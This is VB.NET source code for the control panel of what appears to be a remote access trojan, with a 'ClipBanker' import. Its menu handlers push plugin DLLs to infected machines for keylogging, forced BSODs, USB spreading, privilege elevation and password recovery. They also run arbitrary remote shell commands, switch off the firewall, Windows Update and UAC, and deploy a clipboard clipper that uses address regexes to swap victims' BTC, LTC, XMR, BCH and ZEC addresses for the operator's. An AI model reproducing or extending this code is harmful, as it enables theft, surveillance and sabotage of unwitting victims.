Imports System.CodeDom
Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports Microsoft.VisualBasic.ApplicationServices
Imports System.Net.NetworkInformation
Imports Microsoft.Win32
Imports Microsoft.VisualBasic.Devices
Imports System.Runtime.InteropServices
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Text
Imports System.CodeDom.Compiler
Imports System.Net.Sockets
Imports ClipBanker

Public Class form1
    Public S As Server
    Public trans As Boolean
    Public iconpath As String
    Public assm As String
    Public Sub New()
        InitializeComponent()
        Me.Opacity = 0
        FadeInMain(Me, 20)
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        tlscclient.Server()
    End Sub

    Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("CLOSE")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub




    Private Sub ShowToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        Try
            Me.TopMost = True
            Me.WindowState = FormWindowState.Normal
            Me.TopMost = False
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        Try
            Process.Start(Application.ExecutablePath)

            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Application.Exit()
    End Sub

    Private Sub RestartToolStripMenuItem2_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("rec")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub




    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Application.Exit()
    End Sub

    Private Sub SystemSoundToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("Wsound")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub











    Private Sub NoteToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim str3 As String = Interaction.InputBox("Enter Your Note", "Note")


            Dim B As Byte() = SB("SNote" & Gclass1.SPL & str3)
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


            Try
                For Each C As ListViewItem In l1.SelectedItems
                    If str3 = Nothing Then
                        C.SubItems(11).Text = "Nothing"
                    Else
                        C.SubItems(11).Text = str3
                    End If
                Next
                l1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub

    Private Sub StopToolStripMenuItem2_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("closeKL")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        If trans Then Me.Opacity = 1.0
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Me.Opacity = 0.95
    End Sub

    Private Sub ToolStripMenuItem327_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("RD-")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem328_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("|||")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem329_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("WBCM")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If

    End Sub

    Private Sub ToolStripMenuItem330_Click(sender As Object, e As EventArgs)

        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("MICL")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem331_Click(sender As Object, e As EventArgs)

        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("Wsound")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem332_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("PRG")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem333_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("xxx")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem334_Click(sender As Object, e As EventArgs)

        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("TCPV")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem335_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("getinfo")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem336_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ACT")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem337_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ppp")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem338_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("cbb")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem339_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("PassR")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub



    Private Sub ToolStripMenuItem341_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("JustFun" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class28.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem342_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("MapsPLU" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class33.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub



    Private Sub ToolStripMenuItem133_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("rec")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem134_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("CLOSE")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem135_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim result As Integer = MessageBox.Show("Are you sure?", "Removal!", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
            If result = DialogResult.Yes Then
                Try

                    Dim B As Byte() = SB("uninstall" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class19.dll")))
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem136_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim open As OpenFileDialog = New OpenFileDialog

            Dim result As DialogResult = open.ShowDialog()
            If result = DialogResult.OK Then
                Try
                    Dim B As Byte() = SB("update" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class18.dll")) & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes(open.FileName)) & Gclass1.SPL & IO.Path.GetExtension(open.FileName))
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End If
    End Sub





    Private Sub ToolStripMenuItem140_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim str3 As String = Interaction.InputBox("Enter label ", "Label")
            Dim B As Byte() = SB("SNote" & Gclass1.SPL & str3)
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
            Try
                For Each C As ListViewItem In l1.SelectedItems
                    If str3 = Nothing Then
                        C.SubItems(11).Text = "N/A"
                    Else
                        C.SubItems(11).Text = str3
                    End If
                Next
                l1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub


    Private Sub ToolStripMenuItem362_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim str3 As String = Interaction.InputBox("Add message

 ", "Sending a message", "your message

")
            If (str3.Length = 0) Then
            Else
                Dim B As Byte() = SB("msgg" & Gclass1.SPL & str3)
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem365_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("admin" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class47.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem364_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("admin" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class4.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem391_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("admin" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class46.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem392_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("admin" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class20.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem393_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("Xchat")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem395_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("NETINS" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class30.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem397_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & "shutdown.exe /f /s /t 0")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem398_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim result As Integer = MessageBox.Show("Are you sure ?", "call-BSOD!", MessageBoxButtons.YesNo)
            If result = DialogResult.Yes Then

                Try

                    Dim B As Byte() = SB("BSOD" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class8.dll")))
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try

            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem399_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & "shutdown.exe /f /r /t 0")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem400_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & "shutdown -L")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem402_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & "netsh advfirewall set allprofiles state on")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem403_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & "netsh advfirewall set allprofiles state off")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem405_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("BScreen" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class5.dll")) & Gclass1.SPL & "0")
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem406_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("BScreen" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class5.dll")) & Gclass1.SPL & "1")
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem407_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & "cmd.exe /c net stop wuauserv && sc config wuauserv start= disabled")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem409_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Gclass1.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" & Gclass1.SPL & "0")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem410_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Gclass1.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" & Gclass1.SPL & "1")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub ToolStripMenuItem412_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Gclass1.SPL & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA" & Gclass1.SPL & "1")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem413_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Gclass1.SPL & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA" & Gclass1.SPL & "0")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem415_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Gclass1.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools" & Gclass1.SPL & "1")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub ToolStripMenuItem416_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub ToolStripMenuItem417_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "cmd.exe /c calc"
            Dim str3 As String = Interaction.InputBox("Set command", "Run shell", urle)
            If (str3.Length = 0) Then
            Else
                Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & str3)
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem418_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("DelP" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\Plugins\class45.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem419_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("startusb" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class10.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem420_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("bot" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class7.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem125_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim message As Object = InputBox("Enter your URL", "Open visible URL", "http://")
            If Not String.IsNullOrWhiteSpace(message) Then
                Dim B As Byte() = SB("url" & Gclass1.SPL & message)
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub ToolStripMenuItem128_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim message As Object = InputBox("Enter your URL", "Open invisible URL", "http://")
            If Not String.IsNullOrWhiteSpace(message) Then
                Dim B As Byte() = SB("openhide" & Gclass1.SPL & message)
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If

        End If
    End Sub

    Private Sub ToolStripMenuItem126_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("shellfuc" & Gclass1.SPL & "taskkill /im iexplore.exe /f")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem422_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("KL" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class34.dll")))
                For Each C As ListViewItem In l1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem423_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("closeKL")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem425_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("KLget")
            For Each C As ListViewItem In l1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem427_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "XMR Buffer", "Your XMR address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(4)[a-zA-HJ-NP-Z0-9]{90,98}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem428_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "BCash Buffer

", "Your BCash address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(bitcoincash:|[q])[a-zA-HJ-NP-Z0-9]{26,56}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem429_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "LTC Buffer", "Your LTC address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,48}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem430_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "ZCash Buffer", "Your ZCash address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "t1[0-9A-z]{33}")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem431_Click(sender As Object, e As EventArgs)
        If l1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter your address", "BTC Buffer", "Your BTC address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Gclass1.SPL & Convert.ToBase64String(File.ReadAllBytes("data\plugins\class48.dll")) & Gclass1.SPL & message & Gclass1.SPL & "\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b")
                    For Each C As ListViewItem In l1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

